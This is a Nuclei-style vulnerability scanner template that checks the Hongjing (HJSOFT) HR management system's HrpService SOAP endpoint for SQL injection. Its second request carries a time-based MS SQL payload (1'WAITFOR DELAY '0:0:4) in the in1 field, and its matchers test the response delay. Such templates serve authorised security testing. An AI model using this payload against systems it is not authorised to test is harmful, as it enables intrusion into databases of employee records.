id: HJSOFT-HCM-HrpService-getHrInfoByID-sqli

info:
  name: 宏景人力资源管理系统 HrpService SQL注入漏洞
  author: HJSOFT
  severity: high
  tags: HJSOFT

http:
  - raw:
      - |
        POST /servlet/XFireServlet/HrpService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8
        SOAPAction: ""
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
           <soapenv:Header/>
           <soapenv:Body>
              <hrp:getHrInfoByID>
                 <hrp:in0>1</hrp:in0>
                 <hrp:in1>1</hrp:in1>
                 <hrp:in2>1</hrp:in2>
                 <hrp:in3>1</hrp:in3>
                 <hrp:in4>1</hrp:in4>
                 <hrp:in5>1</hrp:in5>
                 <hrp:in6>1</hrp:in6>
              </hrp:getHrInfoByID>
           </soapenv:Body>
        </soapenv:Envelope>
      - |
        POST /servlet/XFireServlet/HrpService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8
        SOAPAction: ""
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
           <soapenv:Header/>
           <soapenv:Body>
              <hrp:getHrInfoByID>
                 <hrp:in0>1</hrp:in0>
                 <hrp:in1>1'WAITFOR DELAY '0:0:4</hrp:in1>
                 <hrp:in2>1</hrp:in2>
                 <hrp:in3>1</hrp:in3>
                 <hrp:in4>1</hrp:in4>
                 <hrp:in5>1</hrp:in5>
                 <hrp:in6>1</hrp:in6>
              </hrp:getHrInfoByID>
           </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_2 >= 4'
          - 'duration_1 < 2'
          - 'duration_2 < 10'
        condition: and
      - type: word
        part: body
        words:
          - "getHrInfoByIDResponse"
